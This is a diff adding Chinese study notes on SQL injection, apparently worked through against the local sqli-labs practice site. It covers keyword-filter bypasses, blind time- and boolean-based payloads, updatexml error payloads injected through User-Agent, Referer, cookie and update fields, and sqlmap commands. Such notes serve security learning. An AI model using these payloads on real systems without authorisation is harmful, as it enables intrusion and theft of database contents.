@@ -73,6 +73,76 @@ sql注入：
         查询的时候如果使用 rand()，该值会被计算多次。在使用 group by 的时候，floor(rand(0)*2)会被执行一次，如果虚表不存在记录，插入虚表的时候会再被执行一次。在一次多记录的查询过程中floor(rand(0)*2)的值是定性的，为011011。
         less-5/index.php?id=0' union select 1,2,3 from (select count(*), concat((select concat(version(), 0x3a, 0x3a, database(), 0x3a, 0x3a, user(), 0x3a) limit 0, 1), floor(rand(0)*2))x from information_schema.tables group by x)a --+
 
+    SQL注入绕过：
+        大小写绕过：
+            关键字：and， 使用 AnD 绕过
+        双写绕过：
+            关键字：and，使用 anandd 绕过，中间的 and 被发现替换，剩下前面 an 和 后面 d，
+        编码绕过：
+            URL编码
+        内联注释绕过：
+            MySQL中内联注释的内容可以被当作SQL语句执行
+            /*!select*/ * from admin;  
+            /*!select * from admin */;
+
+    POST基于时间和布尔的注入：
+        时间：
+            在参数后加： and if(length(database())>5, sleep(5), null) --+
+
+            admin' and (select (if(length(database())>5, sleep(5), null))) --+
+
+        布尔：
+            admin' and (length(database())>1) --+
+
+        sqlmap.py -u "http://127.0.0.1/sqli/Less-15" --data "uname=admin&passwd=123456&submit=Submit"
+
+
+        SQLMap：
+            获取请求报文
+            sqlmap.py -r target.txt --technique T -p uname
+            sqlmap.py -r target.txt --technique B -p uname
+            sqlmap.py -r target.txt --dbs
+
+    HTTP头的注入：
+        用户提交的参数都被过滤，但是HTTP头的参数可能没有被过滤
+
+        User-Agent注入：
+            结尾加 \ 看是否报错
+            ' and updatexml(1, concat(0x7e, (select @@version), 0x7e), 1) or '1' = '1
+
+        Refere:
+            ' or '1' ='1 
+            ' or(length(database()))>8 or if(1=1, sleep(5), null) or '1' = '1
+
+        SQLMap：
+            sqlmap.py -u "less17" --forms 自动搜索表单注入
+            sqlmap.py -u "less17" --data "n=1%p=1" 指定参数探索
+
+            指定位置进行注入，在保存的文件中，对于参数的修改为*
+            执行 sqlmap.py -r target.txt
+
+    POST update注入：
+        update 表名称 set 列名称=新值 where 更新条件;
+
+        password = admin' or updatexml(1, concat(0x7e, version(), 0x7e), 1) --+
+
+        sqlmap：
+            sqlmap.py -r target.txt -p password
+    
+    cookie注入：
+        注入语句同上
+
+        sqlmap：
+            sqlmap.py -r target.txt --level 3 --batch
+            文件中探测的属性，该值为 * 
+
+    cookie base64 注入：
+        二进制->字符
+        brup suite拦截请求可以看到输入的表单是否被加密
+
+        sqlmap：
+            sqlmap.py -r target.txt --level 3 --tamper base64encode.py
+
     SQLmap： 
         探测：
             -u 探测url
